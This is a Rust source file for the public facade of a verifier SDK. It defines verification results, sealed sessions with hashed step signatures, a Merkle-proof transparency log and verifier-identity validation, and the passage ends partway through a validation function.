#![forbid(unsafe_code)]

//! Universal Verifier SDK -- public facade module.
//!
//! This module re-exports the core verifier SDK types and operations for
//! external consumption. External verifiers depend on this crate to replay
//! capsules, verify signed replay bundles, and reproduce claim verdicts
//! without privileged internal access.
//!
//! # Security Posture
//!
//! This workspace crate publishes deterministic schema, digest, replay, and
//! Ed25519 signed-bundle helpers for external tooling. It remains separate
//! from the replacement-critical canonical verifier, but detached replay
//! bundle signatures are cryptographically verified.
//!
//! # Schema Version
//!
//! The current schema version is `vsdk-v1.0`. All capsules and manifests
//! must carry this version.
//!
//! # Event Codes
//!
//! - CAPSULE_CREATED: A new replay capsule has been created.
//! - CAPSULE_SIGNED: A capsule has been signed.
//! - CAPSULE_REPLAY_START: Capsule replay has started.
//! - CAPSULE_VERDICT_REPRODUCED: Capsule verdict has been reproduced.
//! - SDK_VERSION_CHECK: SDK version compatibility check performed.
//!
//! # Error Codes
//!
//! - ERR_CAPSULE_SIGNATURE_INVALID: Capsule signature verification failed.
//! - ERR_CAPSULE_SCHEMA_MISMATCH: Capsule schema version is not supported.
//! - ERR_CAPSULE_REPLAY_DIVERGED: Replay output does not match expected hash.
//! - ERR_CAPSULE_VERDICT_MISMATCH: Reproduced verdict differs from original.
//! - ERR_SDK_VERSION_UNSUPPORTED: SDK version is not supported.
//! - ERR_CAPSULE_ACCESS_DENIED: Privileged access attempted during replay.
//!
//! # Invariants
//!
//! - INV-CAPSULE-STABLE-SCHEMA: Capsule schema format is stable across SDK versions.
//! - INV-CAPSULE-VERSIONED-API: Every API surface carries a version identifier.
//! - INV-CAPSULE-NO-PRIVILEGED-ACCESS: External replay requires no privileged internal access.
//! - INV-CAPSULE-VERDICT-REPRODUCIBLE: Same capsule always produces the same verdict.

use std::{
    collections::BTreeMap,
    fmt,
    sync::atomic::{AtomicU64, Ordering},
};

use chrono::{SecondsFormat, Utc};
use serde::{Deserialize, Serialize};
use subtle::ConstantTimeEq;

pub mod bundle;
pub mod capsule;
pub mod counterfactual;

/// SDK version string for compatibility checks.
/// INV-CAPSULE-VERSIONED-API: every API surface carries a version identifier.
pub const SDK_VERSION: &str = "vsdk-v1.0";

/// Minimum supported SDK version.
pub const SDK_VERSION_MIN: &str = "vsdk-v1.0";

/// Explicit posture marker for the standalone workspace SDK surface.
pub const STRUCTURAL_ONLY_SECURITY_POSTURE: &str = "structural_only_not_replacement_critical";

/// Stable rule id for guardrails that must fence the workspace SDK surface.
pub const STRUCTURAL_ONLY_RULE_ID: &str = "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK";

// ---------------------------------------------------------------------------
// Event codes (public-facing)
// ---------------------------------------------------------------------------

/// Event: a new replay capsule has been created.
pub const CAPSULE_CREATED: &str = "CAPSULE_CREATED";
/// Event: a capsule has been signed.
pub const CAPSULE_SIGNED: &str = "CAPSULE_SIGNED";
/// Event: capsule replay has started.
pub const CAPSULE_REPLAY_START: &str = "CAPSULE_REPLAY_START";
/// Event: capsule verdict has been reproduced.
pub const CAPSULE_VERDICT_REPRODUCED: &str = "CAPSULE_VERDICT_REPRODUCED";
/// Event: SDK version compatibility check performed.
pub const SDK_VERSION_CHECK: &str = "SDK_VERSION_CHECK";

// ---------------------------------------------------------------------------
// Error codes (public-facing)
// ---------------------------------------------------------------------------

/// Error: capsule signature verification failed.
pub const ERR_CAPSULE_SIGNATURE_INVALID: &str = "ERR_CAPSULE_SIGNATURE_INVALID";
/// Error: capsule schema version is not supported.
pub const ERR_CAPSULE_SCHEMA_MISMATCH: &str = "ERR_CAPSULE_SCHEMA_MISMATCH";
/// Error: replay output does not match expected hash.
pub const ERR_CAPSULE_REPLAY_DIVERGED: &str = "ERR_CAPSULE_REPLAY_DIVERGED";
/// Error: reproduced verdict differs from original.
pub const ERR_CAPSULE_VERDICT_MISMATCH: &str = "ERR_CAPSULE_VERDICT_MISMATCH";
/// Error: SDK version is not supported.
pub const ERR_SDK_VERSION_UNSUPPORTED: &str = "ERR_SDK_VERSION_UNSUPPORTED";
/// Error: privileged access attempted during replay.
pub const ERR_CAPSULE_ACCESS_DENIED: &str = "ERR_CAPSULE_ACCESS_DENIED";

// ---------------------------------------------------------------------------
// Invariants (public-facing)
// ---------------------------------------------------------------------------

/// Invariant: capsule schema format is stable across SDK versions.
pub const INV_CAPSULE_STABLE_SCHEMA: &str = "INV-CAPSULE-STABLE-SCHEMA";
/// Invariant: every API surface carries a version identifier.
pub const INV_CAPSULE_VERSIONED_API: &str = "INV-CAPSULE-VERSIONED-API";
/// Invariant: external replay requires no privileged internal access.
pub const INV_CAPSULE_NO_PRIVILEGED_ACCESS: &str = "INV-CAPSULE-NO-PRIVILEGED-ACCESS";
/// Invariant: same capsule always produces the same verdict.
pub const INV_CAPSULE_VERDICT_REPRODUCIBLE: &str = "INV-CAPSULE-VERDICT-REPRODUCIBLE";

// ---------------------------------------------------------------------------
// SDK version check
// ---------------------------------------------------------------------------

/// Check whether a given SDK version string is supported.
///
/// Returns `Ok(())` if supported, or an error string if not.
///
/// # INV-CAPSULE-VERSIONED-API
/// # INV-CAPSULE-STABLE-SCHEMA
pub fn check_sdk_version(version: &str) -> Result<(), String> {
    if version == SDK_VERSION {
        Ok(())
    } else {
        Err(format!(
            "{}: requested={}, supported={}",
            ERR_SDK_VERSION_UNSUPPORTED, version, SDK_VERSION
        ))
    }
}

/// A structured audit event for SDK operations.
#[derive(Debug, Clone)]
pub struct SdkEvent {
    pub event_code: &'static str,
    pub detail: String,
}

impl SdkEvent {
    pub fn new(event_code: &'static str, detail: impl Into<String>) -> Self {
        Self {
            event_code,
            detail: detail.into(),
        }
    }
}

/// Result verdict exposed by the stable verifier facade.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum VerificationVerdict {
    Pass,
    Fail,
    Inconclusive,
}

impl From<capsule::CapsuleVerdict> for VerificationVerdict {
    fn from(value: capsule::CapsuleVerdict) -> Self {
        match value {
            capsule::CapsuleVerdict::Pass => Self::Pass,
            capsule::CapsuleVerdict::Fail => Self::Fail,
            capsule::CapsuleVerdict::Inconclusive => Self::Inconclusive,
        }
    }
}

/// Stable facade operation names for result and session audit trails.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum VerificationOperation {
    Claim,
    MigrationArtifact,
    TrustState,
    Workflow,
}

/// Stable workflow names accepted by the verifier facade executor.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ValidationWorkflow {
    ReleaseValidation,
    IncidentValidation,
    ComplianceAudit,
}

/// Append-only transparency log entry for facade verification results.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TransparencyLogEntry {
    pub result_hash: String,
    pub timestamp: String,
    pub verifier_id: String,
    /// Encoded Merkle audit path at append time:
    /// `root:<hex>`, `leaf_index:<n>`, `tree_size:<n>`, then `left:<hex>` / `right:<hex>`
    /// sibling hashes from the leaf level toward the root.
    pub merkle_proof: Vec<String>,
}

/// Result of one assertion checked by the facade.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AssertionResult {
    pub assertion: String,
    pub passed: bool,
    pub detail: String,
}

/// Stable result type produced by the workspace verifier facade.
///
/// This is a structural-only external result: `verifier_signature` is a
/// deterministic SDK hash over the result payload, not a replacement-critical
/// detached verifier attestation.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct VerificationResult {
    pub operation: VerificationOperation,
    pub verdict: VerificationVerdict,
    pub confidence_score: f64,
    pub checked_assertions: Vec<AssertionResult>,
    pub execution_timestamp: String,
    pub verifier_identity: String,
    pub artifact_binding_hash: String,
    pub verifier_signature: String,
    pub sdk_version: String,
    #[serde(skip, default)]
    result_origin_nonce: String,
}

/// Single append-only step in a verification session.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SessionStep {
    pub step_index: usize,
    pub operation: VerificationOperation,
    pub verdict: VerificationVerdict,
    pub artifact_binding_hash: String,
    pub timestamp: String,
    pub step_signature: String,
}

/// Stateful multi-step verification workflow.
#[derive(Debug, Clone, PartialEq)]
pub struct VerificationSession {
    pub session_id: String,
    pub verifier_identity: String,
    pub created_at: String,
    steps: Vec<SessionStep>,
    pub sealed: bool,
    pub final_verdict: Option<VerificationVerdict>,
    origin_session_id: String,
    origin_verifier_identity: String,
    origin_created_at: String,
    origin_session_nonce: String,
    session_nonce: String,
}

/// Error returned by the stable verifier facade.
#[derive(Debug, Clone, PartialEq)]
pub enum VerifierSdkError {
    UnsupportedSdk(String),
    Capsule(capsule::CapsuleError),
    Bundle(bundle::BundleError),
    UnauthenticatedStructuralBundle {
        bundle_id: String,
        verifier_identity: String,
    },
    InvalidVerifierIdentity {
        actual: String,
        reason: String,
    },
    InvalidSessionId {
        actual: String,
        reason: String,
    },
    EmptyTrustAnchor,
    MalformedTrustAnchor {
        actual: String,
    },
    TrustAnchorMismatch {
        expected: String,
        actual: String,
    },
    SessionSealed(String),
    SessionVerifierMismatch {
        expected: String,
        actual: String,
    },
    SessionProvenanceMismatch {
        field: &'static str,
        expected: String,
        actual: String,
    },
    SessionStepSequenceMismatch {
        expected: usize,
        actual: usize,
    },
    SessionStepSignatureMismatch {
        step_index: usize,
        expected: String,
        actual: String,
    },
    ResultSignatureMismatch {
        expected: String,
        actual: String,
    },
    ResultOriginMismatch {
        expected: String,
        actual: String,
    },
    Json(String),
}

impl fmt::Display for VerifierSdkError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedSdk(message) => write!(formatter, "{message}"),
            Self::Capsule(source) => write!(formatter, "capsule verification failed: {source}"),
            Self::Bundle(source) => write!(formatter, "bundle verification failed: {source}"),
            Self::UnauthenticatedStructuralBundle {
                bundle_id,
                verifier_identity,
            } => write!(
                formatter,
                "replay bundle {bundle_id} for {verifier_identity} is structural-only and cannot satisfy authenticated verifier provenance"
            ),
            Self::InvalidVerifierIdentity { actual, reason } => write!(
                formatter,
                "verifier identity is invalid: {reason}: got {actual}"
            ),
            Self::InvalidSessionId { actual, reason } => write!(
                formatter,
                "verification session id is invalid: {reason}: got {actual}"
            ),
            Self::EmptyTrustAnchor => write!(formatter, "trust anchor is empty"),
            Self::MalformedTrustAnchor { actual } => write!(
                formatter,
                "trust anchor must be a canonical lowercase 64-nybble sha256 digest: got {actual}"
            ),
            Self::TrustAnchorMismatch { expected, actual } => write!(
                formatter,
                "trust anchor mismatch: expected={expected}, actual={actual}"
            ),
            Self::SessionSealed(session_id) => {
                write!(formatter, "verification session {session_id} is sealed")
            }
            Self::SessionVerifierMismatch { expected, actual } => write!(
                formatter,
                "verification session verifier mismatch: expected={expected}, actual={actual}"
            ),
            Self::SessionProvenanceMismatch {
                field,
                expected,
                actual,
            } => write!(
                formatter,
                "verification session provenance mismatch for {field}: expected={expected}, actual={actual}"
            ),
            Self::SessionStepSequenceMismatch { expected, actual } => write!(
                formatter,
                "verification session step sequence mismatch: expected={expected}, actual={actual}"
            ),
            Self::SessionStepSignatureMismatch {
                step_index,
                expected,
                actual,
            } => write!(
                formatter,
                "verification session step signature mismatch at index {step_index}: expected={expected}, actual={actual}"
            ),
            Self::ResultSignatureMismatch { expected, actual } => write!(
                formatter,
                "verifier SDK result signature mismatch: expected={expected}, actual={actual}"
            ),
            Self::ResultOriginMismatch { expected, actual } => write!(
                formatter,
                "verifier SDK result origin mismatch: expected={expected}, actual={actual}"
            ),
            Self::Json(message) => write!(formatter, "verifier SDK JSON error: {message}"),
        }
    }
}

impl std::error::Error for VerifierSdkError {}

impl From<capsule::CapsuleError> for VerifierSdkError {
    fn from(source: capsule::CapsuleError) -> Self {
        Self::Capsule(source)
    }
}

impl From<bundle::BundleError> for VerifierSdkError {
    fn from(source: bundle::BundleError) -> Self {
        Self::Bundle(source)
    }
}

const RESULT_ORIGIN_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:result-origin:v1:";
const SESSION_STEP_SIGNATURE_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:session-step:v1:";
const SESSION_NONCE_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:session-nonce:v1:";
const TRANSPARENCY_LOG_LEAF_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:transparency-leaf:v1:";
const TRANSPARENCY_MERKLE_PARENT_DOMAIN: &[u8] =
    b"frankenengine-verifier-sdk:transparency-merkle-parent:v1:";
const MAX_VERIFIER_IDENTITY_NAME_LEN: usize = 255;
const MAX_SESSION_ID_LEN: usize = 255;
static SESSION_NONCE_COUNTER: AtomicU64 = AtomicU64::new(1);

/// Top-level facade for external verifier integrations.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct VerifierSdk {
    pub verifier_identity: String,
    pub sdk_version: String,
    pub config: BTreeMap<String, String>,
    #[serde(skip, default = "default_result_origin_nonce")]
    result_origin_nonce: String,
}

impl VerifierSdk {
    /// Create a new verifier SDK facade instance.
    pub fn new(verifier_identity: impl Into<String>) -> Self {
        let mut config = BTreeMap::new();
        config.insert("schema_version".to_string(), SDK_VERSION.to_string());
        config.insert(
            "security_posture".to_string(),
            STRUCTURAL_ONLY_SECURITY_POSTURE.to_string(),
        );
        Self {
            verifier_identity: verifier_identity.into(),
            sdk_version: SDK_VERSION.to_string(),
            config,
            result_origin_nonce: default_result_origin_nonce(),
        }
    }

    /// Verify a claim capsule through the existing capsule replay verifier.
    pub fn verify_claim(
        &self,
        claim: &capsule::ReplayCapsule,
    ) -> Result<VerificationResult, VerifierSdkError> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let replay = capsule::replay(claim, &self.verifier_identity)?;
        let verdict = VerificationVerdict::from(replay.verdict);
        let assertions = vec![
            AssertionResult {
                assertion: "capsule_replay_verified".to_string(),
                passed: verdict == VerificationVerdict::Pass,
                detail: replay.detail.clone(),
            },
            AssertionResult {
                assertion: "capsule_signature_verified".to_string(),
                passed: true,
                detail: "capsule structural signature matched".to_string(),
            },
        ];
        self.build_result(
            VerificationOperation::Claim,
            verdict,
            assertions,
            replay.actual_hash,
        )
    }

    /// Verify a migration artifact as canonical replay bundle bytes.
    pub fn verify_migration_artifact(
        &self,
        artifact: &[u8],
    ) -> Result<VerificationResult, VerifierSdkError> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let verified = bundle::verify(artifact)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;
        Err(VerifierSdkError::UnauthenticatedStructuralBundle {
            bundle_id: verified.bundle_id,
            verifier_identity: verified.verifier_identity,
        })
    }

    /// Verify trust-state bundle bytes against an expected trust anchor hash.
    pub fn verify_trust_state(
        &self,
        state: &[u8],
        anchor_integrity_hash: &str,
    ) -> Result<VerificationResult, VerifierSdkError> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        if anchor_integrity_hash.trim().is_empty() {
            return Err(VerifierSdkError::EmptyTrustAnchor);
        }
        if !is_canonical_sha256_hex(anchor_integrity_hash) {
            return Err(VerifierSdkError::MalformedTrustAnchor {
                actual: anchor_integrity_hash.to_string(),
            });
        }

        let verified = bundle::verify(state)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;
        if !constant_time_eq(anchor_integrity_hash, &verified.integrity_hash) {
            return Err(VerifierSdkError::TrustAnchorMismatch {
                expected: anchor_integrity_hash.to_string(),
                actual: verified.integrity_hash,
            });
        }
        Err(VerifierSdkError::UnauthenticatedStructuralBundle {
            bundle_id: verified.bundle_id,
            verifier_identity: verified.verifier_identity,
        })
    }

    /// Validate canonical replay bundle bytes without producing a facade result.
    pub fn validate_bundle(&self, bundle: &[u8]) -> Result<(), VerifierSdkError> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let verified = bundle::verify(bundle)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;
        Ok(())
    }

    /// Append a signed facade result to an in-memory transparency log.
    pub fn append_transparency_log(
        &self,
        log: &mut Vec<TransparencyLogEntry>,
        result: &VerificationResult,
    ) -> Result<TransparencyLogEntry, VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        self.verify_result_belongs_to_current_verifier(result)?;
        let result_hash = transparency_log_leaf_hash(result)?;
        let mut leaf_hashes: Vec<String> =
            log.iter().map(|entry| entry.result_hash.clone()).collect();
        leaf_hashes.push(result_hash.clone());
        let entry = TransparencyLogEntry {
            result_hash: result_hash.clone(),
            timestamp: current_utc_timestamp(),
            verifier_id: result.verifier_identity.clone(),
            merkle_proof: transparency_merkle_proof(&leaf_hashes, leaf_hashes.len() - 1),
        };
        log.push(entry.clone());
        Ok(entry)
    }

    /// Execute a documented validation workflow against canonical replay bundle bytes.
    pub fn execute_workflow(
        &self,
        _workflow: ValidationWorkflow,
        bundle: &[u8],
    ) -> Result<VerificationResult, VerifierSdkError> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let verified = bundle::verify(bundle)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;
        Err(VerifierSdkError::UnauthenticatedStructuralBundle {
            bundle_id: verified.bundle_id,
            verifier_identity: verified.verifier_identity,
        })
    }

    /// Create a new unsealed verification session.
    pub fn create_session(
        &self,
        session_id: impl Into<String>,
    ) -> Result<VerificationSession, VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        let session_id = session_id.into();
        validate_session_id(&session_id)?;
        let created_at = current_utc_timestamp();
        let session_nonce = derive_session_nonce(
            &session_id,
            &self.verifier_identity,
            &created_at,
            SESSION_NONCE_COUNTER.fetch_add(1, Ordering::Relaxed),
        );
        Ok(VerificationSession {
            session_id: session_id.clone(),
            verifier_identity: self.verifier_identity.clone(),
            created_at: created_at.clone(),
            steps: Vec::new(),
            sealed: false,
            final_verdict: None,
            origin_session_id: session_id.clone(),
            origin_verifier_identity: self.verifier_identity.clone(),
            origin_created_at: created_at.clone(),
            origin_session_nonce: session_nonce.clone(),
            session_nonce,
        })
    }

    /// Append a verification result as the next session step.
    pub fn record_session_step(
        &self,
        session: &mut VerificationSession,
        result: &VerificationResult,
    ) -> Result<SessionStep, VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        validate_session_provenance(session)?;
        if session.sealed {
            return Err(VerifierSdkError::SessionSealed(session.session_id.clone()));
        }
        self.verify_result_belongs_to_current_verifier(result)?;
        if session.origin_verifier_identity != self.verifier_identity {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: session.origin_verifier_identity.clone(),
                actual: self.verifier_identity.clone(),
            });
        }
        if result.verifier_identity != session.origin_verifier_identity {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: session.origin_verifier_identity.clone(),
                actual: result.verifier_identity.clone(),
            });
        }
        let step = SessionStep {
            step_index: session.steps.len(),
            operation: result.operation.clone(),
            verdict: result.verdict.clone(),
            artifact_binding_hash: result.artifact_binding_hash.clone(),
            timestamp: current_utc_timestamp(),
            step_signature: String::new(),
        };
        let step = SessionStep {
            step_signature: session_step_signature(session, &step)?,
            ..step
        };
        session.steps.push(step.clone());
        Ok(step)
    }

    /// Seal a verification session and compute its final verdict.
    pub fn seal_session(
        &self,
        session: &mut VerificationSession,
    ) -> Result<VerificationVerdict, VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        validate_session_provenance(session)?;
        if session.sealed {
            return Err(VerifierSdkError::SessionSealed(session.session_id.clone()));
        }
        if session.origin_verifier_identity != self.verifier_identity {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: self.verifier_identity.clone(),
                actual: session.origin_verifier_identity.clone(),
            });
        }
        for (expected_index, step) in session.steps.iter().enumerate() {
            if step.step_index != expected_index {
                return Err(VerifierSdkError::SessionStepSequenceMismatch {
                    expected: expected_index,
                    actual: step.step_index,
                });
            }
            let expected_signature = session_step_signature(session, step)?;
            if !constant_time_eq(&step.step_signature, &expected_signature) {
                return Err(VerifierSdkError::SessionStepSignatureMismatch {
                    step_index: step.step_index,
                    expected: expected_signature,
                    actual: step.step_signature.clone(),
                });
            }
        }
        let verdict = if session.steps.is_empty() {
            VerificationVerdict::Inconclusive
        } else if session
            .steps
            .iter()
            .all(|step| step.verdict == VerificationVerdict::Pass)
        {
            VerificationVerdict::Pass
        } else {
            VerificationVerdict::Fail
        };
        session.sealed = true;
        session.final_verdict = Some(verdict.clone());
        Ok(verdict)
    }

    fn verify_result_signature(&self, result: &VerificationResult) -> Result<(), VerifierSdkError> {
        let expected = facade_result_signature(result)?;
        if result.verifier_signature.len() == expected.len()
            && bool::from(
                result
                    .verifier_signature
                    .as_bytes()
                    .ct_eq(expected.as_bytes()),
            )
        {
            Ok(())
        } else {
            Err(VerifierSdkError::ResultSignatureMismatch {
                expected,
                actual: result.verifier_signature.clone(),
            })
        }
    }

    fn verify_result_belongs_to_current_verifier(
        &self,
        result: &VerificationResult,
    ) -> Result<(), VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        if !constant_time_eq(&result.result_origin_nonce, &self.result_origin_nonce) {
            return Err(VerifierSdkError::ResultOriginMismatch {
                expected: self.result_origin_nonce.clone(),
                actual: result.result_origin_nonce.clone(),
            });
        }
        self.verify_result_signature(result)?;
        if result.verifier_identity != self.verifier_identity {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: self.verifier_identity.clone(),
                actual: result.verifier_identity.clone(),
            });
        }
        Ok(())
    }

    fn verify_bundle_belongs_to_current_verifier(
        &self,
        bundle: &bundle::ReplayBundle,
    ) -> Result<(), VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        if bundle.verifier_identity != self.verifier_identity {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: self.verifier_identity.clone(),
                actual: bundle.verifier_identity.clone(),
            });
        }
        Ok(())
    }

    fn build_result(
        &self,
        operation: VerificationOperation,
        verdict: VerificationVerdict,
        checked_assertions: Vec<AssertionResult>,
        artifact_binding_hash: String,
    ) -> Result<VerificationResult, VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        let confidence_score = confidence_score_for_result(&verdict, &checked_assertions);
        let mut result = VerificationResult {
            operation,
            verdict,
            confidence_score,
            checked_assertions,
            execution_timestamp: current_utc_timestamp(),
            verifier_identity: self.verifier_identity.clone(),
            artifact_binding_hash,
            verifier_signature: String::new(),
            sdk_version: self.sdk_version.clone(),
            result_origin_nonce: self.result_origin_nonce.clone(),
        };
        result.verifier_signature = facade_result_signature(&result)?;
        Ok(result)
    }

    fn validate_current_verifier_identity(&self) -> Result<(), VerifierSdkError> {
        validate_verifier_identity(&self.verifier_identity)
    }
}

impl VerificationSession {
    pub fn steps(&self) -> &[SessionStep] {
        &self.steps
    }
}

/// Create a top-level SDK facade instance.
pub fn create_verifier_sdk(verifier_identity: impl Into<String>) -> VerifierSdk {
    VerifierSdk::new(verifier_identity)
}

fn facade_result_signature(result: &VerificationResult) -> Result<String, VerifierSdkError> {
    #[derive(Serialize)]
    struct SignatureView<'a> {
        operation: &'a VerificationOperation,
        verdict: &'a VerificationVerdict,
        confidence_score: f64,
        checked_assertions: &'a [AssertionResult],
        execution_timestamp: &'a str,
        verifier_identity: &'a str,
        artifact_binding_hash: &'a str,
        sdk_version: &'a str,
        result_origin_nonce: &'a str,
    }

    let payload = serde_json::to_vec(&SignatureView {
        operation: &result.operation,
        verdict: &result.verdict,
        confidence_score: result.confidence_score,
        checked_assertions: &result.checked_assertions,
        execution_timestamp: &result.execution_timestamp,
        verifier_identity: &result.verifier_identity,
        artifact_binding_hash: &result.artifact_binding_hash,
        sdk_version: &result.sdk_version,
        result_origin_nonce: &result.result_origin_nonce,
    })
    .map_err(|source| VerifierSdkError::Json(source.to_string()))?;
    Ok(bundle::hash(&payload))
}

fn default_result_origin_nonce() -> String {
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, RESULT_ORIGIN_DOMAIN);
    push_length_prefixed(&mut payload, SDK_VERSION.as_bytes());
    payload.extend_from_slice(
        &SESSION_NONCE_COUNTER
            .fetch_add(1, Ordering::Relaxed)
            .to_le_bytes(),
    );
    bundle::hash(&payload)
}

fn current_utc_timestamp() -> String {
    Utc::now().to_rfc3339_opts(SecondsFormat::Micros, true)
}

fn confidence_score_for_result(
    verdict: &VerificationVerdict,
    checked_assertions: &[AssertionResult],
) -> f64 {
    let assertion_ratio = if checked_assertions.is_empty() {
        match verdict {
            VerificationVerdict::Pass => 1.0,
            VerificationVerdict::Fail => 0.0,
            VerificationVerdict::Inconclusive => 0.5,
        }
    } else {
        checked_assertions
            .iter()
            .filter(|assertion| assertion.passed)
            .count() as f64
            / checked_assertions.len() as f64
    };

    match verdict {
        VerificationVerdict::Pass => assertion_ratio,
        VerificationVerdict::Fail => assertion_ratio * 0.5,
        VerificationVerdict::Inconclusive => 0.25 + (assertion_ratio * 0.5),
    }
}

fn derive_session_nonce(
    session_id: &str,
    verifier_identity: &str,
    created_at: &str,
    counter: u64,
) -> String {
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, SESSION_NONCE_DOMAIN);
    push_length_prefixed(&mut payload, session_id.as_bytes());
    push_length_prefixed(&mut payload, verifier_identity.as_bytes());
    push_length_prefixed(&mut payload, created_at.as_bytes());
    payload.extend_from_slice(&counter.to_le_bytes());
    bundle::hash(&payload)
}

fn transparency_merkle_proof(leaf_hashes: &[String], target_index: usize) -> Vec<String> {
    if leaf_hashes.is_empty() || target_index >= leaf_hashes.len() {
        return Vec::new();
    }

    let mut level = leaf_hashes.to_vec();
    let mut index = target_index;
    let mut proof = Vec::new();

    while level.len() > 1 {
        let sibling_index = if index.is_multiple_of(2) {
            if index + 1 < level.len() {
                index + 1
            } else {
                index
            }
        } else {
            index - 1
        };
        let sibling_direction = if index.is_multiple_of(2) {
            "right"
        } else {
            "left"
        };
        proof.push(format!("{sibling_direction}:{}", level[sibling_index]));

        let mut next_level = Vec::with_capacity(level.len().div_ceil(2));
        for pair_start in (0..level.len()).step_by(2) {
            let left = &level[pair_start];
            let right = level.get(pair_start + 1).unwrap_or(left);
            next_level.push(transparency_merkle_parent_hash(left, right));
        }
        level = next_level;
        index /= 2;
    }

    let mut encoded = Vec::with_capacity(proof.len() + 3);
    encoded.push(format!("root:{}", level[0]));
    encoded.push(format!("leaf_index:{target_index}"));
    encoded.push(format!("tree_size:{}", leaf_hashes.len()));
    encoded.extend(proof);
    encoded
}

fn transparency_merkle_parent_hash(left: &str, right: &str) -> String {
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, TRANSPARENCY_MERKLE_PARENT_DOMAIN);
    push_length_prefixed(&mut payload, left.as_bytes());
    push_length_prefixed(&mut payload, right.as_bytes());
    bundle::hash(&payload)
}

fn transparency_log_leaf_hash(result: &VerificationResult) -> Result<String, VerifierSdkError> {
    let result_bytes =
        serde_json::to_vec(result).map_err(|source| VerifierSdkError::Json(source.to_string()))?;
    let mut payload = Vec::new();
    push_length_prefixed(&mut payload, TRANSPARENCY_LOG_LEAF_DOMAIN);
    push_length_prefixed(&mut payload, &result_bytes);
    push_length_prefixed(&mut payload, result.result_origin_nonce.as_bytes());
    Ok(bundle::hash(&payload))
}

fn session_step_signature(
    session: &VerificationSession,
    step: &SessionStep,
) -> Result<String, VerifierSdkError> {
    #[derive(Serialize)]
    struct SessionStepSignatureView<'a> {
        session_id: &'a str,
        verifier_identity: &'a str,
        created_at: &'a str,
        session_nonce: &'a str,
        step_index: usize,
        operation: &'a VerificationOperation,
        verdict: &'a VerificationVerdict,
        artifact_binding_hash: &'a str,
        timestamp: &'a str,
    }

    let payload = serde_json::to_vec(&SessionStepSignatureView {
        session_id: &session.session_id,
        verifier_identity: &session.verifier_identity,
        created_at: &session.created_at,
        session_nonce: &session.session_nonce,
        step_index: step.step_index,
        operation: &step.operation,
        verdict: &step.verdict,
        artifact_binding_hash: &step.artifact_binding_hash,
        timestamp: &step.timestamp,
    })
    .map_err(|source| VerifierSdkError::Json(source.to_string()))?;

    let mut envelope = Vec::new();
    push_length_prefixed(&mut envelope, SESSION_STEP_SIGNATURE_DOMAIN);
    envelope.extend_from_slice(&payload);
    Ok(bundle::hash(&envelope))
}

fn push_length_prefixed(buffer: &mut Vec<u8>, bytes: &[u8]) {
    buffer.extend_from_slice(&(bytes.len() as u64).to_le_bytes());
    buffer.extend_from_slice(bytes);
}

fn constant_time_eq(left: &str, right: &str) -> bool {
    bool::from(left.as_bytes().ct_eq(right.as_bytes()))
}

fn validate_verifier_identity(verifier_identity: &str) -> Result<(), VerifierSdkError> {
    if verifier_identity != verifier_identity.trim() {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: "identity must not contain leading or trailing whitespace".to_string(),
        });
    }
    let Some(remainder) = verifier_identity.strip_prefix("verifier://") else {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: "identity must use the external verifier:// scheme".to_string(),
        });
    };
    if remainder.trim().is_empty() || remainder != remainder.trim() {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: "identity must include a non-empty verifier name".to_string(),
        });
    }
    if remainder.len() > MAX_VERIFIER_IDENTITY_NAME_LEN {
        return Err(VerifierSdkError::InvalidVerifierIdentity {
            actual: verifier_identity.to_string(),
            reason: format!(
                "identity must be at most {MAX_VERIFIER_IDENTITY_NAME_LEN} ASCII bytes after verifier://"
            ),
        });
    }
